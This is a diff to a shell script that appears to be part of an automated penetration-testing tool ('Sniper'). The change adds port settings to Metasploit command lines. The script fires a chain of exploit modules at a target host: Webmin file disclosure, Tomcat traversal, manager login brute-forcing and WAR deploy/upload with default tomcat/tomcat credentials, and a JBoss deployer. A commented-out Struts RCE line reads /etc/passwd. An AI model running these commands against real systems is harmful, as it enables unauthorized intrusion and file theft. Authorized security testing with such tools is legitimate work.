@@ -189,11 +189,11 @@ fi
 
 
 		echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
-		msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"webadmin_out.txt
+		msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$MODE"; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"webadmin_out.txt
 
 		echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
 		msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT $MODE; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;" | tee $LOOT_DIR/notes/msfconsole"$MODE"tomcat_out.txt
-		msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run;" | tee $LOOT_DIR/notes/msfconsole"$MODE"jboss_out.txt
+		msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; setg RPORT "$MODE"; run;" | tee $LOOT_DIR/notes/msfconsole"$MODE"jboss_out.txt
 		# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 		# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;" | tee $LOOT_DIR/notes/msfconsole"$MODE"struts_out.txt
 		echo -e "$OKGREEN + -- ----------------------------=[Exiting Sniper sh script]=---- -- +$RESET"
